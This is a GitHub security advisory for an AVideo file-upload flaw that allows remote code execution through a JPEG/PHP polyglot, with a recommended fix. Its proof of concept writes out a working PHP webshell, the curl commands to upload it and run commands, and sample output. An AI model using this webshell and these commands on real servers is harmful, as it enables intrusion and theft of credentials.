# [H] AVideo Vulnerable to Remote Code Execution via MIME/Extension Mismatch in ImageGallery File Upload

## Summary
Severity: High
Advisory: GHSA-wxjw-phj6-g75w
CVE: CVE-2026-33647
CWE: CWE-434
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-wxjw-phj6-g75w
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `ImageGallery::saveFile()` method validates uploaded file content using `finfo` MIME type detection but derives the saved filename extension from the user-supplied original filename without an allowlist check. An attacker can upload a polyglot file (valid JPEG magic bytes followed by PHP code) with a `.php` extension. The MIME check passes, but the file is saved as an executable `.php` file in a web-accessible directory, achieving Remote Code Execution.

## Details

The vulnerability exists in `plugin/ImageGallery/ImageGallery.php` in the `saveFile()` method:

```php
// plugin/ImageGallery/ImageGallery.php:80-108
static function saveFile($file, $videos_id)
{
    $allowedMimeTypes = ['image/jpeg', 'image/webp', 'image/gif', 'image/png', 'video/mp4'];
    $directory = self::getImageDir($videos_id);

    // MIME check on file CONTENT — bypassable with polyglot
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $fileType = $finfo->file($file['tmp_name']);

    if (in_array($fileType, $allowedMimeTypes)) {
        // Extension from attacker-controlled filename — NO allowlist
        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        do {
            $newFilename = uniqid() . '.' . $extension;
            $newFilePath = $directory . $newFilename;
        } while (file_exists($newFilePath));

        move_uploaded_file($file['tmp_name'], $newFilePath);
        // ...
    }
}
```

**Root cause:** Line 93 extracts the extension from the user-supplied `$file['name']` and uses it directly in the saved filename. There is no check against an allowlist of safe extensions (e.g., `jpg`, `png`, `gif`, `webp`, `mp4`).

**Why the MIME check is insufficient:** PHP's `finfo` with `FILEINFO_MIME_TYPE` inspects file content magic bytes. A file starting with JPEG magic bytes (`\xff\xd8\xff\xe0`) is identified as `image/jpeg` regardless of trailing content. Appending PHP code after the JPEG header creates a polyglot that passes the MIME check but executes as PHP when requested via the web server.

**Why no server-level protection exists:** The root `.htaccess` at line 73 blocks dangerous extensions but uses the pattern `php[a-z0-9]+` — which matches `.php5`, `.phtml`, `.phar`, etc., but intentionally does **not** match plain `.php` (since the application itself requires PHP execution). There is no `.htaccess` in the `videos/` directory to disable PHP execution in the upload target.

**Upload path:** Files are saved to `videos/{videoFilename}/ImageGallery/{uniqid}.php` — directly accessible via the web server.

The upload endpoint at `plugin/ImageGallery/upload.json.php` requires:
1. The ImageGallery plugin to be enabled (line 6-8)
2. An authenticated user (line 10-12)
3. The user must have manage permission on the video (line 18-20) — video owner or admin

The response at line 27 calls `listFiles()` which returns the full URL of each uploaded file, giving the attacker the exact path to their webshell.

## PoC

**Prerequisites:** Authenticated AVideo user account that owns at least one Image or Gallery type video.

**Step 1: Create a polyglot PHP/JPEG file**
```bash
printf '\xff\xd8\xff\xe0\x00\x10JFIF' > shell.php
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' >> shell.php
```

**Step 2: Verify it passes finfo detection**
```bash
file --mime-type shell.php
# Expected output: shell.php: image/jpeg
```

**Step 3: Upload via ImageGallery endpoint**
```bash
curl -b 'PHPSESSID=<session_cookie>' \
  -F "upl=@shell.php;filename=shell.php" \
  'https://target/plugin/ImageGallery/upload.json.php?videos_id=<VIDEO_ID>'
```

**Expected response:**
```json
{
  "videos_id": "123",
  "saveFile": true,
  "error": false,
  "list": [
    {
      "base": "67890abcdef12.php",
      "type": "image/jpeg",
      "url": "https://target/videos/video_filename/ImageGallery/67890abcdef12.php"
    }
  ]
}
```

**Step 4: Execute the webshell**
```bash
curl 'https://target/videos/video_filename/ImageGallery/67890abcdef12.php?c=id'
# Expected output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Impact

An authenticated user with edit permission on any Image/Gallery video can achieve **Remote Code Execution** as the web server user. This allows:

- Reading sensitive configuration files (database credentials in `videos/configuration.php`)
- Full database access via the database credentials
- Reading/modifying/deleting any file accessible to the web server process
- Lateral movement within the server's network
- Potential privilege escalation depending on server configuration

Any AVideo instance with the ImageGallery plugin enabled and user registration open is vulnerable. Since regular (non-admin) users can exploit this against their own videos, the barrier to exploitation is low.

## Recommended Fix

Add an extension allowlist check in `saveFile()` immediately after extracting the extension. The extension should be validated against the same set of types as the MIME allowlist:

```php
// plugin/ImageGallery/ImageGallery.php — in saveFile(), after line 93
static function saveFile($file, $videos_id)
{
    $allowedMimeTypes = ['image/jpeg', 'image/webp', 'image/gif', 'image/png', 'video/mp4'];
+   $allowedExtensions = ['jpg', 'jpeg', 'webp', 'gif', 'png', 'mp4'];

    $directory = self::getImageDir($videos_id);

    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $fileType = $finfo->file($file['tmp_name']);

    if (in_array($fileType, $allowedMimeTypes)) {
        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+       if (!in_array($extension, $allowedExtensions)) {
+           return false;
+       }
        do {
            $newFilename = uniqid() . '.' . $extension;
```

Additionally, as defense-in-depth, add a `.htaccess` file to the `videos/` directory to disable PHP execution:

```apache
# videos/.htaccess
php_flag engine off
<FilesMatch "\.php$">
    Require all denied
</FilesMatch>
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-wxjw-phj6-g75w
- https://nvd.nist.gov/vuln/detail/CVE-2026-33647
- https://github.com/WWBN/AVideo/commit/345a8d3ece0ad1e1b71a704c1579cbf885d8f3ae
- https://github.com/WWBN/AVideo
